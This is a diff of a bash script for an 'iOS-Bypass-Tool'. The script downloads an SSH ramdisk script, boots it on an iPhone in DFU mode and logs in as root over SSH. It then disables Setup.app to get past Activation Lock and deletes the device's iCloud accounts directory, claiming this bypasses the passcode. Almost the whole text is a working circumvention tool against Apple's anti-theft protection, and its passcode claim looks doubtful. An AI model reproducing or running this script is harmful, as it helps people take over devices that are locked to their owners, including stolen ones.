@@ -3,12 +3,14 @@
 # ==============================================================================
 # Bypass Script for iOS-Bypass-Tool
 # Coded by: Ayoub
-# Version: 7.1 - The Passcode & Activation Fix
 # ==============================================================================
 
 # --- Strict Mode & Safety Net ---
 set -euo pipefail
 IFS=$'\n\t'
+
+# --- Cleanup Trap ---
+trap 'echo -e "\n${YELLOW}[WARNING] Bypass script interrupted.${NC}"' ERR INT TERM
 
 # --- Logging Setup ---
 LOG_DIR="logs"
@@ -16,6 +18,7 @@ mkdir -p "$LOG_DIR"
 LOG_FILE="$LOG_DIR/bypass-$(date +%Y%m%d-%H%M%S).log"
 exec > >(tee -a "$LOG_FILE") 2>&1
 echo "Log file for this session: $LOG_FILE"
+uname -a
 echo "-------------------------------------"
 
 # --- Color Definitions & Helpers ---
@@ -26,12 +29,14 @@ warn() { echo -e "${YELLOW}[WARNING] $1${NC}"; }
 error() { echo -e "${RED}[ERROR] $1${NC}" >&2; exit 1; }
 
 # --- Sudo Check ---
-if [[ $EUID -ne 0 ]]; then
-   error "This script must be run as root."
-fi
+if [[ $EUID -ne 0 ]]; then error "This script must be run as root."; fi
+info "Running with root privileges."
+
+# --- Receive Arguments ---
+SIMULATE=${1:-false}
 
 # --- Configuration ---
-SSH_RD_SCRIPT="./ssh-rd.sh"
+SSH_RD_SCRIPT="./sshrd.sh"
 SSH_RD_URL="https://raw.githubusercontent.com/verygenericname/SSHRD_Script/main/sshrd.sh"
 
 # --- Download Logic ---
@@ -39,55 +44,68 @@ if [ -f "$SSH_RD_SCRIPT" ]; then
     success "SSH_RD script already exists. Skipping download."
 else
     info "Downloading SSH_RD script..."
-    if command -v curl &>/dev/null; then
-        curl -L -o "$SSH_RD_SCRIPT" "$SSH_RD_URL"
-    else
-        wget -O "$SSH_RD_SCRIPT" "$SSH_RD_URL"
-    fi
+    if command -v curl &>/dev/null; then curl -L -o "$SSH_RD_SCRIPT" "$SSH_RD_URL"; else wget -O "$SSH_RD_SCRIPT" "$SSH_RD_URL"; fi
     chmod +x "$SSH_RD_SCRIPT"
     success "Download complete."
 fi
 
-# --- Real Bypass Steps ---
+# --- Bypass Steps ---
 warn "IMPORTANT: The device should be in DFU mode for this step."
 read -p "--> Press [Enter] to start the SSH Ramdisk and Bypass process..."
 
-info "Step 1: Building the SSH Ramdisk..."
-./"$SSH_RD_SCRIPT" build
+MAX_RETRIES=3
+RETRY_COUNT=0
 
-info "Step 2: Booting the SSH Ramdisk..."
-./"$SSH_RD_SCRIPT" boot
+if [ "$SIMULATE" = true ]; then
+    warn "[SIMULATION] Pretending to build and boot SSH Ramdisk..."
+    sleep 2
+    info "[SIMULATION] Pretending to connect via SSH and apply bypass..."
+    warn "[SIMULATION] Would run the following commands on the device:"
+    echo "   -> mount -uw /mnt6/ && mount -uw /mnt1/"
+    echo "   -> mv /mnt6/Applications/Setup.app /mnt6/Applications/Setup.app.bak"
+    echo "   -> rm -rf /mnt1/mobile/Library/Accounts/"
+    echo "   -> reboot"
+    sleep 2
+else
+    # --- REAL PATH ---
+    until ./"$SSH_RD_SCRIPT" boot; do
+        RETRY_COUNT=$((RETRY_COUNT+1))
+        if [ "$RETRY_COUNT" -ge "$MAX_RETRIES" ]; then
+            error "Failed to boot SSH Ramdisk after $MAX_RETRIES attempts."
+        fi
+        warn "Boot failed. Retrying in 5 seconds... (Attempt $((RETRY_COUNT+1))/$MAX_RETRIES)"
+        sleep 5
+    done
+    success "SSH Ramdisk booted successfully!"
 
-info "Step 3: Connecting via SSH and applying bypass..."
-# The ssh-rd script opens a tunnel on port 2222.
-ssh -p 2222 -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" root@localhost << EOF
-# --- Mount filesystems ---
-echo "Mounting filesystems..."
-mount -uw /mnt6/
-mount -uw /mnt1/
+    info "Connecting via SSH and applying bypass..."
+    ssh -p 2222 -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" root@localhost << 'EOF'
+# Stop on first error to prevent partial bypass
+set -e
 
-# --- Bypass 1: Activation Lock (Hello Screen) ---
-echo "Attempting to bypass Activation Lock..."
+echo "--> Mounting filesystems with write access..."
+mount -uw /mnt6/ && mount -uw /mnt1/
+echo "--> Filesystems mounted."
+
 if [ -d "/mnt6/Applications/Setup.app" ]; then
+    echo "--> Renaming Setup.app to disable it..."
     mv /mnt6/Applications/Setup.app /mnt6/Applications/Setup.app.bak
-    echo "-> Setup.app renamed successfully."
+    echo "--> Setup.app has been renamed."
 else
-    echo "-> Setup.app not found, already bypassed?"
+    echo "--> Setup.app not found, skipping rename."
 fi
 
-# --- Bypass 2: Passcode Lock --- ### THIS IS THE NEW, CRITICAL PART ###
-echo "Attempting to bypass Passcode lock..."
-ACCOUNTS_DIR="/mnt1/mobile/Library/Accounts/"
-if [ -d "$ACCOUNTS_DIR" ]; then
-    rm -rf "$ACCOUNTS_DIR"
-    echo "-> Accounts directory deleted successfully."
+if [ -d "/mnt1/mobile/Library/Accounts/" ]; then
+    echo "--> Deleting iCloud account data..."
+    rm -rf /mnt1/mobile/Library/Accounts/
+    echo "--> Accounts directory has been deleted."
 else
-    echo "-> Accounts directory not found."
+    echo "--> Accounts directory not found, skipping delete."
 fi
 
-# --- Finalizing ---
-echo "Bypass applied! Rebooting device..."
+echo "--> Bypass commands sent successfully! Rebooting device now..."
 reboot
 EOF
+fi
 
-success "Bypass script completed! The device will reboot into the Home Screen."
+success "Bypass script completed! The device should reboot into the Home Screen."
